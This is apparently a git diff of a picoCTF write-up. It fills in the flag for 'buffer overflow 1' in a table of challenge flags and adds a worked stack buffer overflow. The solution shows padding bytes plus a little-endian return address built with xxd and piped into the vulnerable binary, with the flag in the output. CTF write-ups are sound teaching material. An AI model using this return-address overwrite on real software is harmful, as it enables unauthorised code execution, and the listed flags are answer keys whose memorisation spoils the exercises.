@@ -50,7 +50,7 @@ Secret Agent                 Web              200     picoCTF{s3cr3t_ag3nt_m4n_1
 Truly an Artist              Forensics        200
 be-quick-or-be-dead-1        Reversing        200
 blaise's cipher              Cryptography     200     picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_cdf08bf0}
-buffer overflow 1            Binary Exploit   200
+buffer overflow 1            Binary Exploit   200     picoCTF{addr3ss3s_ar3_3asy56a7b196}
 leak-me                      Binary Exploit   200
 now you don't                Forensics        200     picoCTF{n0w_y0u_533_m3}
 shellcode                    Binary Exploit   200
@@ -1511,10 +1511,47 @@ $ objdump -x -d vuln
 ...
 ```
 
-So we want to return to there?
+So we want to return to `0x080485cb`
+
+First I experimented with some known characters in order to figure out the byte
+mapping because little endian doesn't work with `xxd -r`
+
+```
+$ echo -n 'ÏÖ' | xxd -e # Little endian
+00000000: 96c38fc3                             ....
+$ echo -n 'ÏÖ' | xxd    # Big endian
+00000000: c38f c396                                ....
+$ # 080485cb < our target string
+$ echo '00000000: cb85 0408' | xxd -r
+$ # And the mapping is a bunch of unprintable characters.
+```
+
+This needs to be prefixed with a known length of buffer so we'll just construct something xxd is happy with:
+
+```
+00000000: 61616161 61616161 61616161 61616161
+00000010: 61616161 61616161 61616161 61616161
+00000020: 61616161 61616161 61616161 cb850408
+```
+
+And then run this on the server:
+
+```
+$ echo '00000000: 61616161 61616161 61616161 61616161
+00000010: 61616161 61616161 61616161 61616161
+00000020: 61616161 61616161 61616161 cb850408' | xxd -r | ./vuln
+Please enter your string:
+Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
+picoCTF{addr3ss3s_ar3_3asy56a7b196}Segmentation fault
+```
+
+It works!!!
 
 **Flag**
 
+```
+picoCTF{addr3ss3s_ar3_3asy56a7b196}Segmentation fault
+```
 
 ## Binary Exploitation 200: leak-me
 
